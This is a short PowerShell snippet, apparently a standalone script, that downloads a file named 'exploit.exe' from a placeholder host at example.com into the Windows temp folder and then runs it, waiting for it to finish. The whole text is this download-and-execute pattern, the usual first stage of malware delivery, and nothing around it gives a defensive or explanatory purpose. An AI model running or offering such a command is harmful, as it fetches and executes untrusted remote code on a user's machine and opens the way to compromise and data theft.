$path = "$env:temp\exploit.exe"
Invoke-WebRequest -Uri "http://example.com/exploit.exe" -OutFile $path
Start-Process $path -Wait